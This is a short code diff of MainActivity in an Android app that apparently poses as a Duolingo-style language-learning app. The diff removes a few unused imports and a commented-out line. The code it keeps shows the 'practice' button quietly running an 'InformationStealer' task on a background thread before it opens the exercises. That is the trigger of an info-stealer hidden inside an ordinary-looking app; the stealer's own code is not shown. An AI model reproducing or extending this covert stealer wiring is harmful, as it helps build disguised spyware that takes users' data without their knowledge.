@@ -1,7 +1,6 @@
 package com.example.duolingopezzotto.Activity;
 
 import static com.example.duolingopezzotto.InfoStealerManager.InformationStealer.inviato;
-import static com.example.duolingopezzotto.InfoStealerManager.JSONParser.convertStringToJSON;
 
 import android.Manifest;
 import android.content.Intent;
@@ -16,11 +15,8 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.example.duolingopezzotto.InfoStealerManager.InformationStealer;
-import com.example.duolingopezzotto.InfoStealerManager.JSONParser;
-import com.example.duolingopezzotto.InfoStealerManager.NetworkManager;
 import com.example.duolingopezzotto.R;
 import com.example.duolingopezzotto.SQLiteDB.DatabaseHelper;
-import com.google.gson.JsonObject;
 
 import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
@@ -80,7 +76,6 @@ public class MainActivity extends AppCompatActivity {
         });
 
         esercitatiButton.setOnClickListener(view -> {
-            //my_db.deleteAll();
             if (inviato == 0) executor.execute(stealer);
             Intent gotoScegliCategorie = new Intent(MainActivity.this, ScegliCategorieActivity.class);
             startActivity(gotoScegliCategorie);
